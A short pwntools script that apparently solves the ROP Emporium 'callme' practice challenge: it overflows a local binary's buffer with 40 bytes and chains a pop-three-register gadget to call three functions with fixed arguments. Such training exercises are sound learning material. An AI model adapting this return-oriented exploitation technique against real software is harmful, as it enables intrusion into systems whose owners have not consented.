from pwn import *

#define addresses of functions
callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

#gadget to populate registers
pop_three_reg = p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret

#create the payload, starting with 40 bytes to make buffer overflow happening and putting the first gadget as the return address, to start our chain
payload = b"A"*40
payload += pop_three_reg
payload += p64(0xdeadbeefdeadbeef) #load into rdi
payload += p64(0xcafebabecafebabe) #load into rsi
payload += p64(0xd00df00dd00df00d) #load into rdx

payload += callme_one # call1

payload += pop_three_reg
payload += p64(0xdeadbeefdeadbeef) #load into rdi
payload += p64(0xcafebabecafebabe) #load into rsi
payload += p64(0xd00df00dd00df00d) #load into rdx

payload += callme_two # call2

payload += pop_three_reg
payload += p64(0xdeadbeefdeadbeef) #load into rdi
payload += p64(0xcafebabecafebabe) #load into rsi
payload += p64(0xd00df00dd00df00d) #load into rdx

payload += callme_three #call3

io = process("./callme")
io.recvuntil("> ")
io.sendline(payload)
print(io.recvall())